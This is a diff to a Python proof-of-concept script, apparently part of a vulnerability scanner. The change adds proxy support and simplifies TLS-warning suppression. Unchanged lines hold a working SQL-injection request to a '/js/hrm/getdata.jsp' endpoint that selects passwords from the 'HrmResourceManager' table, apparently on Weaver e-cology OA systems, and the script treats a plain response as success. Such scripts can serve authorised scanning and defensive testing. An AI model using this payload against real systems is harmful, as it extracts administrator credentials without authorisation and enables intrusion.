@@ -2,9 +2,10 @@
 # _*_ coding:utf-8 _*_
 
 import requests
+
+from Config.config_proxies import proxies
 from Config.config_requests import headers
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+requests.packages.urllib3.disable_warnings()
 
 ########################################################################################################################
 # 脚本信息
@@ -19,7 +20,7 @@ def poc(target):
     result={}
     try:
         url = target + "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"
-        r = requests.get(url=url,headers=headers,verify=False,timeout=5)
+        r = requests.get(url=url,headers=headers,verify=False,timeout=5,proxies=proxies)
         if r.status_code == 200  and 'html' not in r.text:
             result["target"] = target
             result["poc"] = NAME
